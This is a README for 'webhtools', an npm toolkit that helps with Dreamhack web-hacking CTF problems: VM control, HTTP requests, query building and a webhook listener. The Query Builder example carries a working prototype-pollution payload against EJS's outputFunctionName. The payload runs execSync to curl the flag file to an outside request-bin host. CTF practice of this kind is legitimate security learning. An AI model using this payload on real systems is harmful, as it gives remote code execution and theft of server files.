## Webhtools
This is set of useful tool for webhacking. Includes request helper, dreamhack helper etc.

### Installation
```shell
npm install webhtools
```

### Usage
#### Dreamhack Problem Tools
```typescript
import {ProblemHelper} from "webhtools";

async function run() {
  // const ph = await new ProblemHelper(<problemId>).init();
  const ph = await new ProblemHelper(927);

  await ph.openVM();
  // exploit
  console.log(ph.getURL());
  await ph.closeVM();
}

run();
```
At first time, you need to enter your dreamhack account info.

#### Request Helper

```typescript
import {RequestHelper, ProblemHelper} from "webhtools";

// const ph = await new ProblemHelper(927)
//
// const rh = new RequestHelper(await ph.openVM());

// this works well.
const rh = await RequestHelper.from(927);
rh.setContentType("application/json");
rh.setBearerAuth(tokenRes.json.token);
const res = await rh.get("/");
console.log(res.ok);
console.log(res.status);
console.log(res.bytes);
console.log(res.text);
console.log(res.json);
console.log(res.formData);

// in fact, you don't need to close vm. it will close automatically
// await ph.closeVM();
```

#### Query Builder
```js
import { RequestHelper, QueryBuilder } from "webhtools";

const client = new RequestHelper("http://localhost:3000");

const data = {
  key: "__proto__",
  value: {
    "settings": {
      "view options": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync(\"curl --data $(cat ./flag) 'https://cghilzr.request.dreamhack.games'\");s"
      }
    }
  }
}
await client.get('/?'+new QueryBuilder(data));
console.log(new QueryBuilder(data))₩
```

### webhook
```typescript
const webhook = new Webhook(8000);
const url = await webhook.publish();

return await new Promise((resolve) => {
  webhook.set("/test", (req) => {
    webhook.disconnect();
    resolve(req.body.toString());
  })

  fetch(`${url}/test`, { method: "POST", body: "hello" });
})
```